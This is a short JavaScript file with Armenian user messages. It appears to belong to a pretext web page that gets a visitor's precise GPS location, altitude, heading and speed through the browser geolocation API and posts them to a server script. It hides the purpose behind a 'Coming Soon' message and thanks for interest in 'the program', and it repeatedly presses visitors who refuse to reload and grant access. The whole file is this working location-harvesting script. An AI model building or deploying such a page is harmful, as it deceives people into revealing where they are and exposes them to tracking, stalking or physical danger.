function locate()
{
  if(navigator.geolocation)
  {
    var optn = {enableHighAccuracy : true, timeout : 30000, maximumage: 0};
    navigator.geolocation.getCurrentPosition(showPosition, showError, optn);
  }
  else
  {
    alert('Ձեր browser-ը աշխատում է ոչ կորրեկտ');
  }
  function showPosition(position)
  {
    var lat = position.coords.latitude;
    var lon = position.coords.longitude;
    var acc = position.coords.accuracy;
    var alt = position.coords.altitude;
    var dir = position.coords.heading;
    var spd = position.coords.speed;
    $.ajax({
      type: 'POST',
      url: '/php/result.php',
      data: {Lat: lat, Lon: lon, Acc: acc, Alt: alt, Dir: dir, Spd: spd},
      success: function(){$('#change').html('Coming Soon');},
      mimeType: 'text'
    });
    alert('Շնորհակալություն ծրագրի հանդեպ հետաքրքրություն ցուցաբերելու համար ։)');
  };
}

function showError(error)
{
	switch(error.code)
  {
		case error.PERMISSION_DENIED:
			var denied = 'user denied the request for geolocation';
      alert('Խնդրում ենք թարմացնել էջը և թույլ տալ browser-ին օգտագործել գեոլոկացիոն տվյալներ');
      break;
		case error.POSITION_UNAVAILABLE:
			var unavailable = 'location information is unavailable';
			break;
		case error.TIMEOUT:
			var timeout = 'the request to get user location timed out';
      alert('Խնդրում ենք թարմացնել էջը և թույլ տալ browser-ին օգտագործել գեոլոկացիոն տվյալներ');
			break;
		case error.UNKNOWN_ERROR:
			var unknown = 'аn unknown error occurred';
			break;
	}

  $.ajax({
    type: 'POST',
    url: '/php/error.php',
    data: {Denied: denied, Una: unavailable, Time: timeout, Unk: unknown},
    mimeType: 'text'
  });
}
